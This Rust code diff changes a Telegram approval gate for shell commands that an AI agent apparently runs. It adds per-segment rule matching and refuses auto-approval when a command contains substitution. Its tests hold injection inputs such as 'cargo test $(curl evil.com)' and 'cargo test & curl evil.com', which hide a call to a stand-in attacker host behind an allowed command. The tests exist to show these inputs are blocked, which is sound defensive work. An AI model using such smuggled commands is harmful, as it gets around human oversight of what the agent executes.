@@ -3,7 +3,10 @@ use std::sync::Arc;
 
 use tokio::sync::{Mutex, oneshot};
 
-use crate::db::{Database, generate_edit_pattern, generate_pattern};
+use crate::db::{
+    Database, contains_command_substitution, generate_edit_pattern, generate_narrow_pattern,
+    generate_pattern,
+};
 use crate::error::Error;
 use crate::telegram::{InlineKeyboardButton, InlineKeyboardMarkup, TelegramBot};
 use crate::tool::{
@@ -41,6 +44,9 @@ struct PendingApproval {
     sender: oneshot::Sender<ApprovalDecision>,
     message_id: i64,
     original_text: String,
+    /// patterns offered via "always" buttons, indexed by position.
+    /// callback data references patterns by index to stay within telegram's 64-byte limit.
+    patterns: Vec<String>,
 }
 
 /// shared state for pending approval requests.
@@ -89,7 +95,7 @@ impl TelegramApprover {
         chat_id: i64,
         message_id: Option<i64>,
     ) -> bool {
-        // format: exec:{nonce}:{action} or exec:{nonce}:allow_always:{pattern}
+        // format: exec:{nonce}:{action} or exec:{nonce}:always:{idx}
         let parts: Vec<&str> = data.splitn(4, ':').collect();
         if parts.len() < 3 || parts[0] != "exec" {
             return false;
@@ -121,8 +127,9 @@ impl TelegramApprover {
 
         let decision = match action {
             "allow_once" | "allow_rule" => ApprovalDecision::AllowOnce,
-            "allow_always" => {
-                let pattern = parts.get(3).unwrap_or(&"").to_string();
+            "always" => {
+                let idx: usize = parts.get(3).and_then(|s| s.parse().ok()).unwrap_or(0);
+                let pattern = approval.patterns.get(idx).cloned().unwrap_or_default();
                 ApprovalDecision::AllowAlways { pattern }
             }
             "deny" => ApprovalDecision::Deny,
@@ -140,8 +147,9 @@ impl TelegramApprover {
         let decision_text = match action {
             "allow_once" => "approved (once)".to_string(),
             "allow_rule" => "approved".to_string(),
-            "allow_always" => {
-                let pattern = parts.get(3).unwrap_or(&"");
+            "always" => {
+                let idx: usize = parts.get(3).and_then(|s| s.parse().ok()).unwrap_or(0);
+                let pattern = approval.patterns.get(idx).map(|s| s.as_str()).unwrap_or("");
                 format!("approved (always: {pattern})")
             }
             "deny" => "denied".to_string(),
@@ -179,13 +187,18 @@ impl Approver for TelegramApprover {
             .and_then(|v| v.as_str())
             .unwrap_or("");
 
-        // for exec commands, check stored approval rules before prompting
-        if !is_rule_add
-            && !is_text_editor
-            && let Ok(Some(_rule_id)) = self.db.find_matching_rule(command)
-        {
-            tracing::debug!(command, "auto-approved by stored rule");
-            return Ok(ApprovalDecision::AutoApproved);
+        // for exec commands, check stored approval rules before prompting (per-segment).
+        // never auto-approve commands with command substitution ($() or backticks) —
+        // the substituted content executes unchecked by pattern matching.
+        let has_substitution = contains_command_substitution(command);
+        let mut uncovered_segments: Vec<String> = Vec::new();
+        if !is_rule_add && !is_text_editor && !has_substitution {
+            let coverage = self.db.check_command_coverage(command)?;
+            if coverage.fully_covered {
+                tracing::debug!(command, "auto-approved by stored rules");
+                return Ok(ApprovalDecision::AutoApproved);
+            }
+            uncovered_segments = coverage.uncovered_segments;
         }
 
         // for text editor commands, check edit rules by path
@@ -245,11 +258,23 @@ impl Approver for TelegramApprover {
             (text, true)
         } else {
             let has_sensitive = references_sensitive_env(command);
-            let mut text = format!("command: {command}");
+            let cwd = tool_call
+                .input
+                .get("cwd")
+                .and_then(|v| v.as_str())
+                .unwrap_or("");
+            let mut text = if cwd.is_empty() {
+                format!("command: {command}")
+            } else {
+                format!("command: {command}\n  in: {cwd}")
+            };
             if has_sensitive {
                 text.push_str("\n⚠ references sensitive environment variables");
             }
-            (text, !has_sensitive)
+            if has_substitution {
+                text.push_str("\n⚠ contains command substitution ($() or backticks)");
+            }
+            (text, !has_sensitive && !has_substitution)
         };
 
         let approve_action = if is_rule_add {
@@ -257,35 +282,83 @@ impl Approver for TelegramApprover {
         } else {
             "allow_once"
         };
-        let mut buttons = vec![InlineKeyboardButton {
-            text: "approve".into(),
-            callback_data: format!("exec:{nonce}:{approve_action}"),
-        }];
+        let row1 = vec![
+            InlineKeyboardButton {
+                text: "approve".into(),
+                callback_data: format!("exec:{nonce}:{approve_action}"),
+            },
+            InlineKeyboardButton {
+                text: "deny".into(),
+                callback_data: format!("exec:{nonce}:deny"),
+            },
+        ];
 
+        // collect patterns for "always" buttons. stored on PendingApproval and
+        // referenced by index in callback_data to stay within telegram's 64-byte limit.
+        let mut patterns = Vec::new();
+        let mut row2 = Vec::new();
         if show_allow_always {
-            let pattern = if is_text_editor {
+            if is_text_editor {
                 let path = tool_call
                     .input
                     .get("path")
                     .and_then(|v| v.as_str())
                     .unwrap_or("");
-                generate_edit_pattern(path)
+                let pattern = generate_edit_pattern(path);
+                let idx = patterns.len();
+                patterns.push(pattern.clone());
+                row2.push(InlineKeyboardButton {
+                    text: format!("always: {pattern}"),
+                    callback_data: format!("exec:{nonce}:always:{idx}"),
+                });
             } else {
-                generate_pattern(command)
-            };
-            buttons.push(InlineKeyboardButton {
-                text: format!("always: {pattern}"),
-                callback_data: format!("exec:{nonce}:allow_always:{pattern}"),
-            });
+                // for exec commands, generate pattern buttons for uncovered segments
+                let segments_to_cover = if uncovered_segments.is_empty() {
+                    vec![command.to_string()]
+                } else {
+                    uncovered_segments.clone()
+                };
+
+                // collect all narrow and broad patterns, deduplicating
+                let mut narrow_list = Vec::new();
+                let mut broad_list = Vec::new();
+                for seg in &segments_to_cover {
+                    if let Some(narrow) = generate_narrow_pattern(seg)
+                        && !narrow_list.contains(&narrow)
+                    {
+                        narrow_list.push(narrow);
+                    }
+                    let broad = generate_pattern(seg);
+                    if !broad_list.contains(&broad) {
+                        broad_list.push(broad);
+                    }
+                }
+
+                for narrow in &narrow_list {
+                    let idx = patterns.len();
+                    patterns.push(narrow.clone());
+                    row2.push(InlineKeyboardButton {
+                        text: format!("always: {narrow}"),
+                        callback_data: format!("exec:{nonce}:always:{idx}"),
+                    });
+                }
+                for broad in &broad_list {
+                    let idx = patterns.len();
+                    patterns.push(broad.clone());
+                    row2.push(InlineKeyboardButton {
+                        text: format!("always: {broad}"),
+                        callback_data: format!("exec:{nonce}:always:{idx}"),
+                    });
+                }
+            }
         }
 
-        buttons.push(InlineKeyboardButton {
-            text: "deny".into(),
-            callback_data: format!("exec:{nonce}:deny"),
-        });
-
+        let mut keyboard_rows = vec![row1];
+        if !row2.is_empty() {
+            keyboard_rows.push(row2);
+        }
         let keyboard = InlineKeyboardMarkup {
-            inline_keyboard: vec![buttons],
+            inline_keyboard: keyboard_rows,
         };
 
         let message_id = self
@@ -304,6 +377,7 @@ impl Approver for TelegramApprover {
                     sender: tx,
                     message_id,
                     original_text: text,
+                    patterns,
                 },
             );
         }
@@ -388,6 +462,7 @@ mod tests {
                     sender: tx,
                     message_id: 42,
                     original_text: "command: ls".into(),
+                    patterns: vec![],
                 },
             );
         }
@@ -428,6 +503,7 @@ mod tests {
                     sender: tx,
                     message_id: 99,
                     original_text: "command: rm stuff".into(),
+                    patterns: vec![],
                 },
             );
         }
@@ -454,6 +530,7 @@ mod tests {
                     sender: tx,
                     message_id: 100,
                     original_text: "command: ls *".into(),
+                    patterns: vec!["ls *".into()],
                 },
             );
         }
@@ -517,6 +594,128 @@ mod tests {
         let call = make_call(EXEC_TOOL_NAME, json!({"command": "rm stuff"}));
         let result = approver.request_approval(&call).await;
         // the fake bot can't send messages, so this will error
+        assert!(result.is_err());
+    }
+
+    #[tokio::test]
+    async fn test_telegram_approver_blocks_auto_approval_with_substitution() {
+        // even with a matching rule, commands with $() or backticks must not auto-approve
+        let db = Arc::new(Database::open_in_memory().unwrap());
+        db.save_approval_rule("cargo *").unwrap();
+
+        let bot = Arc::new(TelegramBot::new("fake-token".into()));
+        let pending = Arc::new(PendingApprovals::new());
+        let approver = TelegramApprover::new(bot, 123, pending, db);
+
+        // this matches "cargo *" but contains command substitution — should NOT auto-approve
+        let call = make_call(
+            EXEC_TOOL_NAME,
+            json!({"command": "cargo test $(curl evil.com)"}),
+        );
+        let result = approver.request_approval(&call).await;
+        // won't auto-approve, will try to send telegram message which fails with fake token
+        assert!(result.is_err());
+    }
+
+    #[tokio::test]
+    async fn test_telegram_approver_blocks_backtick_substitution() {
+        let db = Arc::new(Database::open_in_memory().unwrap());
+        db.save_approval_rule("cargo *").unwrap();
+
+        let bot = Arc::new(TelegramBot::new("fake-token".into()));
+        let pending = Arc::new(PendingApprovals::new());
+        let approver = TelegramApprover::new(bot, 123, pending, db);
+
+        let call = make_call(
+            EXEC_TOOL_NAME,
+            json!({"command": "cargo test `curl evil.com`"}),
+        );
+        let result = approver.request_approval(&call).await;
+        assert!(result.is_err());
+    }
+
+    #[tokio::test]
+    async fn test_telegram_approver_auto_approves_piped_command() {
+        let db = Arc::new(Database::open_in_memory().unwrap());
+        db.save_approval_rule("cargo *").unwrap();
+        db.save_approval_rule("grep *").unwrap();
+
+        let bot = Arc::new(TelegramBot::new("fake-token".into()));
+        let pending = Arc::new(PendingApprovals::new());
+        let approver = TelegramApprover::new(bot, 123, pending, db);
+
+        let call = make_call(
+            EXEC_TOOL_NAME,
+            json!({"command": "cargo test 2>&1 | grep FAIL"}),
+        );
+        let decision = approver.request_approval(&call).await.unwrap();
+        assert_eq!(decision, ApprovalDecision::AutoApproved);
+    }
+
+    #[tokio::test]
+    async fn test_telegram_approver_auto_approves_chain() {
+        let db = Arc::new(Database::open_in_memory().unwrap());
+        db.save_approval_rule("cargo *").unwrap();
+
+        let bot = Arc::new(TelegramBot::new("fake-token".into()));
+        let pending = Arc::new(PendingApprovals::new());
+        let approver = TelegramApprover::new(bot, 123, pending, db);
+
+        let call = make_call(
+            EXEC_TOOL_NAME,
+            json!({"command": "cargo fmt && cargo clippy && cargo test"}),
+        );
+        let decision = approver.request_approval(&call).await.unwrap();
+        assert_eq!(decision, ApprovalDecision::AutoApproved);
+    }
+
+    #[tokio::test]
+    async fn test_telegram_approver_blocks_partial_pipe_coverage() {
+        let db = Arc::new(Database::open_in_memory().unwrap());
+        db.save_approval_rule("cargo *").unwrap();
+        // no grep rule — second pipe segment uncovered
+
+        let bot = Arc::new(TelegramBot::new("fake-token".into()));
+        let pending = Arc::new(PendingApprovals::new());
+        let approver = TelegramApprover::new(bot, 123, pending, db);
+
+        let call = make_call(EXEC_TOOL_NAME, json!({"command": "cargo test | grep FAIL"}));
+        let result = approver.request_approval(&call).await;
+        // not auto-approved, tries to send telegram message, fails with fake token
+        assert!(result.is_err());
+    }
+
+    #[tokio::test]
+    async fn test_telegram_approver_auto_approves_env_prefixed() {
+        let db = Arc::new(Database::open_in_memory().unwrap());
+        db.save_approval_rule("cargo *").unwrap();
+
+        let bot = Arc::new(TelegramBot::new("fake-token".into()));
+        let pending = Arc::new(PendingApprovals::new());
+        let approver = TelegramApprover::new(bot, 123, pending, db);
+
+        let call = make_call(
+            EXEC_TOOL_NAME,
+            json!({"command": "RUST_LOG=debug RUST_BACKTRACE=1 cargo test"}),
+        );
+        let decision = approver.request_approval(&call).await.unwrap();
+        assert_eq!(decision, ApprovalDecision::AutoApproved);
+    }
+
+    #[tokio::test]
+    async fn test_telegram_approver_blocks_background_injection() {
+        let db = Arc::new(Database::open_in_memory().unwrap());
+        db.save_approval_rule("cargo *").unwrap();
+
+        let bot = Arc::new(TelegramBot::new("fake-token".into()));
+        let pending = Arc::new(PendingApprovals::new());
+        let approver = TelegramApprover::new(bot, 123, pending, db);
+
+        let call = make_call(
+            EXEC_TOOL_NAME,
+            json!({"command": "cargo test & curl evil.com"}),
+        );
+        let result = approver.request_approval(&call).await;
         assert!(result.is_err());
     }
 }
